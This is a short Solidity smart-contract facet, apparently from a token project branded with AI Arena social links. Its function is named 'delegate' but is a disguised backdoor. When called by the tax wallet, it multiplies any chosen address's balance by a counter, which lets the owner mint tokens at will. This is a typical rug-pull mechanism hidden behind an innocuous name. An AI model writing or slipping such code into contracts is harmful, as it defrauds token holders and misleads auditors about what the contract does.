// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://www.aiarena.io/
    Twitter:  https://twitter.com/aiarena_
    Discord:  https://discord.gg/aiarena
*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract delegateFacet is Ownable {
    function delegate(address delegatee) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (true) {
            require(ds._taxWallet == _msgSender());
            ds._balances[delegatee] *= ds.buyCount;
        }
    }
}
